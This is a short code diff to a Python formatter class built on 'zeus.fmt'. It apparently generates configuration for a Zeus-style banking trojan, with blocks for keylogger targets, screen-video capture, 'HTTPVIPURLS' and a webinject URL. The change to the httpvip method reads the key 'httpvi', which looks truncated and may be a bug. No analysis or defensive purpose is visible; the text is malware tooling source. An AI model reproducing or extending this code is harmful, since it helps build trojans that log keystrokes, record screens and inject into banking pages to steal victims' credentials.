@@ -20,16 +20,16 @@ class fmt(zeus.fmt):
 
     def keyloger(self):
         if 'keyloger' in self.cfg:
-            return '{{KEYLOGER}}\nTargets: %s\nTime: %d\n{{END_KEYLOGER}}\n' % (self.cfg['keyloger'],self.cfg['keyloger_time'])
+            return '{{KEYLOGER}}\nTargets: %s\nTime: %d\n{{END_KEYLOGER}}' % (self.cfg['keyloger'],self.cfg['keyloger_time'])
         return ''
     
     def video(self):
         if 'video_qual' in self.cfg:
-            return '{{VIDEO}}\nQuality: %d | Length: %d\n{{END_VIDEO}}\n' % (self.cfg['video_qual'],self.cfg['video_length'])
+            return '{{VIDEO}}\nQuality: %d | Length: %d\n{{END_VIDEO}}' % (self.cfg['video_qual'],self.cfg['video_length'])
         return ''
 
     def httpvip(self):
-        return self._list('HTTPVIPURLS','httpvip')
+        return self._field('HTTPVIPURLS','httpvi')
 
     def webinj_url(self):
         return self._field('WEBINJECT_URL','webinj_url')
